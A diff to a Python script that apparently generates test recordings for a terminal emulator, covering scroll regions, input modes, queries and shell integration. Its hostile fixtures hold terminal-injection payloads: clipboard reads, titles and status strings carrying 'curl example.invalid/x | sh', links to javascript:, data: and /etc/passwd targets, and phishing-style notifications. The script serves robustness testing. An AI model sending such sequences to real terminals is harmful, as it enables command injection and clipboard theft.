@@ -1,8 +1,10 @@
 """Writes the authored corpus recordings: `input.bin` and `script.toml` for each.
 
-These five streams are authored here, not captured from real programs. They exercise the
-dump format and the replay helper. Captures of real shells and full-screen programs are
-added once Lume has a PTY to record from.
+These streams are authored here, not captured from real programs: what a recording holds
+is then known line by line, and nothing of the machine it was made on ends up in it.
+The first group exercises what a terminal shows. The second holds what programs ask a
+terminal and what they switch on in it. The third is hostile: streams that try to make
+the terminal say something back, run away with memory, or misbehave at its limits.
 
 Run from the repository root:
 
@@ -18,13 +20,19 @@ from pathlib import Path
 ROOT = Path(__file__).resolve().parent
 ESC = "\x1b"
 CSI = ESC + "["
+OSC = ESC + "]"
+DCS = ESC + "P"
+APC = ESC + "_"
+ST = ESC + "\\"
+BEL = "\x07"
 
 
-def write(name: str, description: str, cols: int, rows: int, data: str, resizes=()):
-    """`resizes` is a list of (marker_index, cols, rows); offsets are byte offsets."""
+def write(name: str, description: str, cols: int, rows: int, data, resizes=()):
+    """`data` is text, or bytes for a stream that is not valid UTF-8. `resizes` is a list
+    of (byte_offset, cols, rows)."""
     directory = ROOT / name
     directory.mkdir(exist_ok=True)
-    payload = data.encode("utf-8")
+    payload = data if isinstance(data, bytes) else data.encode("utf-8")
     (directory / "input.bin").write_bytes(payload)
     lines = [
         f'description = "{description}"',
@@ -141,6 +149,244 @@ def resize_and_reflow():
     return data, [(at_narrow, 20, 12), (at_wide, 60, 12)]
 
 
+def goto(row: int, col: int) -> str:
+    return f"{CSI}{row};{col}H"
+
+
+def scroll_regions() -> str:
+    out = []
+    for i in range(1, 17):
+        out.append(goto(i, 1) + f"line {i:02}")
+    # A region on rows 4 to 10. A line feed on its last row scrolls the region only.
+    out.append(CSI + "4;10r" + goto(10, 1) + "\n\n" + "fed at the bottom")
+    # Reverse index on its first row scrolls it the other way.
+    out.append(goto(4, 1) + ESC + "M" + ESC + "M" + "reversed at the top")
+    # Scroll up by two and down by one, without moving the cursor.
+    out.append(CSI + "2S" + CSI + "1T")
+    # Insert two lines and delete one, inside the region.
+    out.append(goto(6, 1) + CSI + "2L" + "inserted" + goto(8, 1) + CSI + "1M")
+    # With origin mode, row 1 is the region's first row.
+    out.append(CSI + "?6h" + goto(1, 20) + "origin" + CSI + "?6l")
+    out.append(CSI + "r")
+    # Left and right margins: text wraps between columns 10 and 30.
+    out.append(CSI + "?69h" + CSI + "10;30s" + goto(12, 10))
+    out.append("text that wraps between the two margins it was given")
+    out.append(CSI + "?69l" + goto(16, 1))
+    return "".join(out)
+
+
+def input_modes() -> str:
+    out = []
+    out.append("modes a full-screen program turns on\r\n")
+    # Application cursor keys and keypad, mouse reporting in SGR form, focus events,
+    # bracketed paste and alternate scroll.
+    out.append(CSI + "?1h" + ESC + "=")
+    out.append(CSI + "?1000h" + CSI + "?1002h" + CSI + "?1006h")
+    out.append(CSI + "?1004h" + CSI + "?2004h" + CSI + "?1007h")
+    # Is bracketed paste on? Is mouse reporting? Is any-event reporting, which was not set?
+    out.append(CSI + "?2004$p" + CSI + "?1000$p" + CSI + "?1003$p")
+    # The keyboard protocol: push flags, then ask which are in force.
+    out.append(CSI + ">5u" + CSI + "?u")
+    # Insert mode is an ANSI mode; ask for it by its ANSI number.
+    out.append(CSI + "4h" + CSI + "4$p")
+    out.append("abc" + goto(2, 1) + "X")
+    out.append(CSI + "4l")
+    # Some are turned off again; the keyboard flags are popped.
+    out.append(CSI + "?1002l" + CSI + "?1007l" + CSI + "<u" + CSI + "?u")
+    # A bar cursor that does not blink.
+    out.append(CSI + "6 q" + goto(4, 1) + "left as the program left it")
+    return "".join(out)
+
+
+def synchronized_output() -> str:
+    out = []
+    out.append("frame 0\r\n")
+    # A frame drawn between the two marks is shown whole.
+    out.append(CSI + "?2026h")
+    out.append(CSI + "?2026$p")
+    out.append(CSI + "2J" + goto(1, 1) + "frame 1, line 1" + goto(2, 1) + "frame 1, line 2")
+    out.append(CSI + "?2026l")
+    out.append(CSI + "?2026$p")
+    # A second frame over the first.
+    out.append(CSI + "?2026h" + goto(1, 7) + "2" + goto(2, 7) + "2" + goto(3, 1) + "done")
+    out.append(CSI + "?2026l")
+    return "".join(out)
+
+
+def shell_integration() -> str:
+    out = []
+    prompt = "user@host:~/project$ "
+    out.append(OSC + "7;file://host/home/user/project" + ST)
+    out.append(OSC + "2;user@host: ~/project" + ST)
+    # A prompt, the command typed at it, its output, and its end with a status.
+    out.append(OSC + "133;A" + ST + prompt + OSC + "133;B" + ST + "make test\r\n")
+    out.append(OSC + "133;C" + ST + "running 3 tests\r\nok\r\n" + OSC + "133;D;0" + ST)
+    # What the program says it is doing, while it does it.
+    out.append(OSC + "7501;state=working:app=make:msg=YnVpbGRpbmc=" + ST)
+    out.append(OSC + "133;A" + ST + prompt + OSC + "133;B" + ST + "false\r\n")
+    out.append(OSC + "133;C" + ST + OSC + "133;D;1" + ST)
+    out.append(OSC + "7501;state=done:app=make" + ST)
+    # The same marks ended with BEL, as older shells send them.
+    out.append(OSC + "7;file://host/tmp" + BEL + OSC + "133;A" + BEL + prompt)
+    # Asking what statuses are understood is answered only by a terminal that shows them.
+    out.append(OSC + "7501;?" + ST)
+    return "".join(out)
+
+
+def full_screen_program() -> str:
+    out = []
+    out.append("$ editor notes.txt\r\n")
+    # Start-up: the alternate screen, the title kept for later, the keys and the mouse.
+    out.append(CSI + "?1049h" + CSI + "22;0;0t" + CSI + "?1h" + ESC + "=")
+    out.append(CSI + "?2004h" + CSI + "?1000h" + CSI + "?1006h")
+    # What it asks before it draws: what the terminal is, the background colour, the
+    # keyboard protocol, where the cursor is, and the cursor's style.
+    out.append(CSI + ">c" + CSI + "c" + OSC + "11;?" + BEL + CSI + "?u" + CSI + "6n")
+    out.append(DCS + "$q q" + ST)
+    out.append(OSC + "2;notes.txt - editor" + ST)
+    out.append(CSI + "2J" + CSI + "H")
+    text = [
+        "# Notes",
+        "",
+        "- the first thing",
+        "- the second thing, which is long enough to say something",
+        "- a third",
+    ]
+    for number, line in enumerate(text, 1):
+        out.append(goto(number, 1) + CSI + "38;5;243m" + f"{number:3} " + CSI + "0m" + line)
+    for row in range(len(text) + 1, 23):
+        out.append(goto(row, 1) + CSI + "34m~" + CSI + "0m")
+    out.append(goto(23, 1) + CSI + "7m" + " notes.txt [+]".ljust(60) + "5,3   All ".rjust(20) + CSI + "0m")
+    out.append(goto(24, 1) + "-- INSERT --")
+    # The text scrolls by one line inside the rows above the status line.
+    out.append(CSI + "1;22r" + goto(22, 1) + "\n" + CSI + "r")
+    out.append(goto(22, 1) + CSI + "38;5;243m" + "  6 " + CSI + "0m" + "- a line that scrolled in")
+    # A bar cursor while inserting, left on the text.
+    out.append(CSI + "6 q" + goto(4, 10))
+    return "".join(out)
+
+
+def queries() -> str:
+    out = []
+    out.append("questions a program asks its terminal\r\n")
+    # Who are you: answerback, the three device attributes, the name and version.
+    out.append("\x05" + CSI + "c" + CSI + ">c" + CSI + "=c" + CSI + ">q")
+    # Are you well, where is the cursor, and where with the page.
+    out.append(CSI + "5n" + goto(2, 5) + CSI + "6n" + CSI + "?6n")
+    # How large is the text area, in cells and in pixels, and how large is a cell.
+    out.append(CSI + "18t" + CSI + "14t" + CSI + "16t" + CSI + "19t")
+    # Is the user's colour scheme dark or light.
+    out.append(CSI + "?996n")
+    # What colour is the text, the background, the cursor, and palette entry 1.
+    out.append(OSC + "10;?" + ST + OSC + "11;?" + ST + OSC + "12;?" + ST + OSC + "4;1;?" + ST)
+    # What are the graphic rendition, the scroll region and the conformance level set to.
+    out.append(CSI + "1;31m" + DCS + "$qm" + ST + CSI + "0m")
+    out.append(CSI + "3;9r" + DCS + "$qr" + ST + CSI + "r")
+    out.append(DCS + '$q"p' + ST)
+    # What does the terminal description call this terminal ("TN").
+    out.append(DCS + "+q544e" + ST)
+    # A mode nobody has heard of.
+    out.append(CSI + "?9999$p")
+    out.append(goto(3, 1) + "and the answers went to the program, not the screen")
+    return "".join(out)
+
+
+def hostile_clipboard() -> str:
+    out = []
+    out.append("a program that goes for the clipboard\r\n")
+    # Asking to read the clipboard, the selection, and both.
+    out.append(OSC + "52;c;?" + BEL + OSC + "52;p;?" + ST + OSC + "52;cp;?" + ST)
+    # Putting a command on it: base64 of "curl example.invalid/x | sh" and a newline.
+    out.append(OSC + "52;c;Y3VybCBleGFtcGxlLmludmFsaWQveCB8IHNoCg==" + BEL)
+    # The same with text that is not base64, and with nothing.
+    out.append(OSC + "52;c;not base64 at all!" + ST + OSC + "52;c;" + ST)
+    # The newer protocol's read.
+    out.append(OSC + "5522;type=read:mime=dGV4dC9wbGFpbg==" + ST)
+    out.append("nothing was answered and nothing is shown of it\r\n")
+    return "".join(out)
+
+
+def hostile_title() -> str:
+    out = []
+    out.append("a program that tries to have its own words typed back at it\r\n")
+    # A title that would be a command if it came back as input.
+    out.append(OSC + "2;\"; curl example.invalid/x | sh #" + BEL)
+    # Report the title, the icon label, and the title again after putting it on the stack.
+    out.append(CSI + "21t" + CSI + "20t" + CSI + "22;0;0t" + CSI + "23;0;0t" + CSI + "21t")
+    # A status request that carries a command instead of a setting.
+    out.append(DCS + "$q; curl example.invalid/x | sh\r" + ST)
+    # The font, which some terminals report with what was set.
+    out.append(OSC + "50;?" + BEL)
+    # A colour set to a string, then asked for.
+    out.append(OSC + "10;; curl example.invalid/x | sh" + BEL + OSC + "10;?" + BEL)
+    out.append("whatever was answered holds none of it\r\n")
+    return "".join(out)
+
+
+def hostile_links() -> str:
+    out = []
+    link = lambda target, text: OSC + "8;;" + target + ST + text + OSC + "8;;" + ST
+    out.append("links that are not what they seem\r\n")
+    out.append(link("javascript:alert(1)", "an ordinary link") + "\r\n")
+    out.append(link("file:///etc/passwd", "https://example.com/safe") + "\r\n")
+    out.append(link("data:text/html,<script>alert(1)</script>", "click here") + "\r\n")
+    out.append(link("https://example.com/" + "a" * 3000, "a very long address") + "\r\n")
+    # With an id, and one that is never closed.
+    out.append(OSC + "8;id=x;https://example.com/one" + ST + "opened with an id" + OSC + "8;;" + ST + "\r\n")
+    out.append(OSC + "8;;https://example.com/unclosed" + ST + "never closed\r\nand still going\r\n")
+    return "".join(out)
+
+
+def hostile_limits() -> bytes:
+    out = []
+    out.append("a program that pushes at every limit\r\n")
+    # A title far longer than any window shows.
+    out.append(OSC + "2;" + "A" * 5000 + BEL)
+    # The cursor sent far outside the screen, each way.
+    out.append(goto(99999, 99999) + "E" + CSI + "99999A" + CSI + "99999D" + "S")
+    # One character repeated more often than the screen has cells.
+    out.append(goto(3, 1) + "r" + CSI + "99999b")
+    # A rendition with hundreds of parameters, and one with a number past any limit.
+    out.append(goto(2, 1) + CSI + ";".join(["1"] * 300) + "m" + "bold" + CSI + "0m")
+    out.append(CSI + "99999999999999999999m" + CSI + "38;2;999;999;999m" + "colour" + CSI + "0m")
+    # Inserting and deleting more than there is.
+    out.append(goto(4, 1) + "keep" + CSI + "99999@" + CSI + "99999P" + CSI + "99999L" + CSI + "99999M")
+    # A scroll region that makes no sense.
+    out.append(CSI + "0;99999r" + CSI + "9;2r" + CSI + "r")
+    # Asking the window to become enormous, to move, and to go away.
+    out.append(CSI + "8;9999;9999t" + CSI + "3;0;0t" + CSI + "2t")
+    # A picture by each protocol, which this terminal does not draw.
+    out.append(APC + "Ga=T,f=24,s=1,v=1;AAAA" + ST)
+    out.append(DCS + "q#0;2;0;0;0#0~~@@vv@@~~@@~~$" + ST)
+    # A notification, by each of the two sequences for it.
+    out.append(OSC + "9;your session has expired, type your password" + BEL)
+    out.append(OSC + "777;notify;Update;run this command" + ST)
+    # A string that is never ended swallows what follows until something ends it.
+    out.append(goto(5, 1) + DCS + "never ended " + "x" * 200 + "\x18" + "after the cancel")
+    payload = "".join(out).encode("utf-8")
+    # Bytes that are not UTF-8, a control from the upper range, and a NUL.
+    payload += goto(6, 1).encode() + b"bad:\xff\xfe\xc3(\xe2\x82 \x9b31mC1 \x00nul"
+    payload += (goto(7, 1) + "and the terminal is still standing").encode()
+    return payload
+
+
+def full_reset() -> str:
+    out = []
+    # Everything a program can leave behind: a title, a directory, modes, the alternate
+    # screen, a scroll region, colours, a cursor style.
+    out.append(OSC + "2;left behind" + ST + OSC + "7;file://host/left/behind" + ST)
+    out.append(CSI + "?1049h" + CSI + "?1000h" + CSI + "?2004h" + CSI + "4h" + CSI + "?25l")
+    out.append(CSI + "3;5r" + CSI + "1;31;44m" + CSI + "6 q" + "left on the alternate screen")
+    # A full reset takes all of it away.
+    out.append(ESC + "c" + "after the reset")
+    return "".join(out)
+
+
+def scroll_flood() -> str:
+    # Far more lines than the screen has rows: everything but the last few scrolls away.
+    return "".join(f"{i:05}\r\n" for i in range(1, 5001)) + "end"
+
+
 def main():
     write("01-plain-shell", "A shell session: prompts, backspace, tabs, scrolling, soft wrap, carriage return", 80, 24, plain_shell())
     write("02-colors-attributes", "SGR colours and attributes: 16, 256 and direct colour, bold, italic, underline styles", 80, 24, colors_and_attributes())
@@ -148,6 +394,18 @@ def main():
     write("04-alternate-screen", "A full-screen program: alternate screen, cursor addressing, scroll region, erase, insert and delete", 40, 20, alternate_screen())
     data, resizes = resize_and_reflow()
     write("05-resize-reflow", "Soft-wrapped text reflowed by narrowing and then widening the grid", 40, 12, data, resizes)
+    write("06-scroll-regions", "Scroll regions: line feed and reverse index at the margins, scrolling, insert and delete lines, origin mode, left and right margins", 40, 16, scroll_regions())
+    write("07-input-modes", "Modes for the keyboard and the mouse, set, asked for and reset: cursor keys, mouse reporting, focus, bracketed paste, the keyboard protocol, insert", 60, 8, input_modes())
+    write("08-synchronized-output", "Frames drawn between the synchronized-output marks, and the mode asked for inside and outside them", 40, 6, synchronized_output())
+    write("09-shell-integration", "What a shell reports about itself: the working directory, the title, prompt and command marks, program status", 60, 10, shell_integration())
+    write("10-full-screen-program", "An editor starting up: the alternate screen, its questions, the mouse and the keys, a scrolling text area and a status line", 80, 24, full_screen_program())
+    write("11-queries", "Questions a program asks its terminal, each answered once: identity, cursor, size, colours, settings", 80, 6, queries())
+    write("12-hostile-clipboard", "Hostile: reading the clipboard and putting a command on it", 60, 6, hostile_clipboard())
+    write("13-hostile-title", "Hostile: a title, a status request and a colour that would be commands if the terminal sent them back", 70, 6, hostile_title())
+    write("14-hostile-links", "Hostile: links whose target is a script, a local file, or not what the text says", 60, 10, hostile_links())
+    write("15-hostile-limits", "Hostile: an oversized title, numbers past every limit, pictures, notifications, an unended string, bytes that are not UTF-8", 40, 8, hostile_limits())
+    write("16-scroll-flood", "Five thousand lines through a six-row screen", 20, 6, scroll_flood())
+    write("17-full-reset", "A full reset after a program left a title, a directory, modes, the alternate screen and colours behind", 40, 6, full_reset())
 
 
 if __name__ == "__main__":
